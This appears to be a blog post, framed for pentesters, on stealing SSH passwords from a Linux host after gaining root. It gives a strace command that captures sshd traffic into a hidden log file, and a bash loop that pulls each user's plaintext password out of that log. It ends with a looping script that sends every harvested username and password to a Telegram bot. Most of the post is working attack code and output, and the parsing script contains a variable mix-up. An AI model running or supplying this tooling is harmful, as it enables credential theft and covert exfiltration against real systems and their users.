---
layout: post
title: Stealing SSH credentials.
description: Some times during a pentest you get a root access to a linux workstation or a server, but you don't have the root password, so what to do to get it?
keywords: ssh, pwning, bash, G4mbl3r
disqus: true
tags: [SSH]
categories: Persistence
---
#### Ok I became root what can I do now?.
BEFORE ALL, it's an old trick, but all the tutorials that I found didn't work for me, so I just wrote my own :).
Sometimes when you get root access to a server or a workstation, you don't really have the root password, sometimes you just exploit the server, and got id 0, what can I do in this case?

Well I know two ways to do this, recompile ssh with some extra code, or monitor sshd proccess and get the password on the fly, this time I'll talk about the second option.

There is a linux tool called strace, it's a debbuger, where you can attach running proccess to (WAIT FOR IT) debug it, so basically, what I'm going to do is monitor the sshd proccess.

{% highlight bash %}
strace -f -p $(pgrep -f "/usr/sbin/sshd") -s 128 -o /root/.gpg/auth.log
{% endhighlight %}

Let's undestand what it's doing,
strace : Debbuger
-f : Option to monitor child proccess
-p : Option to set the sshd proccess pid
-s : limit the string size to 128 the default is 32
-o : set the output file (REALLY IMPORTANT)

so just to test start the strace log on your linux over ssh, stop strace and do a grep for your password on the output file and it'll be there.

But it's not enought, we need to parse the file to get the user that owns this password, and get if the login was successful, to do that I wrote a bash script to get the password of every user with a shell.
{% highlight bash %}
for user in $(grep -vE 'nologin|false' /etc/passwd | cut -d ":" -f 1);do
  PASSWORD=$(grep -B 40 -E "authentication.*$user" .gpg/auth.log | grep "read(6" | grep -v unfinished | cut -d '"' -f 2 | sed 's/\\.//g')
  if [  "$PASSWORD" ];then
    echo "USER: $user"
    echo $NEWPASS
  fi
done
{% endhighlight %}

OUTPUT:
{% highlight bash %}
USER: gambler
5umasenhamuitoforteaqui!!!
{% endhighlight %}


BUT WAIT...

It's not a perfect method, it's functional but no perfect, as you can se on my grep, a search for some infos, that may change from one distro to another, so if you want to use it on your pentest's, be prepared to write your own greps, also, the sshd receives some nullbytes with the password, where I remove with the sed, but the next byte after the nullbytes is the size of the password, so how I'm totally laze I don't expend too much time trying to clean this info, then some times the password came with an extra character on begin, just like in the output above, there is the character 5 on the begining of the password.

Just to help all the tests were made on a Debian 9 with openssh-server 7.4p1-10+deb9u2.

And just to complete, here is a example of how get notified when you capture a password,

{% highlight bash %}
#!/bin/bash

API="YOUR BOT API GOES HERE"
USERID="YOUR TELEGRAM NUMERIC ID GOES HERE"
PATHLOG="/root/.gpg"
LOGFILE="$PATHLOG/auth.log"
LASTPASS=""
NEWPASS=""
MIDDLEWARE=""

function install(){
  if ! command -v strace || ! command -v curl;then
    if command -v apt-get &> /dev/null ;then
      apt-get install strace curl
    elif command -v yum &>/dev/null ;then
      yum install strace curl
    fi
  fi
}

function sendMessage(){
  if [[ "$MIDDLEWARE" != "$LASTPASS"  ]];then
    MESSAGE="$MIDDLEWARE"
    curl --silent "https://api.telegram.org/bot$API/sendMessage?chat_id=$USERID&text=$MESSAGE" >> /dev/null
    LASTPASS="$MIDDLEWARE"
  fi
}

function debian(){
  for user in $(grep -vE 'nologin|false' /etc/passwd | cut -d ":" -f 1);do
    NEWPASS=$(grep -E "authentication.*acct=..$user" .gpg/auth.log -B 50 | grep "write(4" | grep unfinished | cut -d '"' -f 2 | sed 's/\\.//g')
    if [ ! -z "$NEWPASS" ];then
	    NEWPASS="USER: $user PASSWD: $(echo $NEWPASS | tr '\n' ' ')"
      MIDDLEWARE="$MIDDLEWARE $NEWPASS"
    fi
  done
  echo "$MIDDLEWARE"
}

function main(){
  debian
  sendMessage
  MIDDLEWARE=""
  sleep 1
}
while true;do
main
done
{% endhighlight %}

This bash script send a message to you on telegram when it's identify a new login.
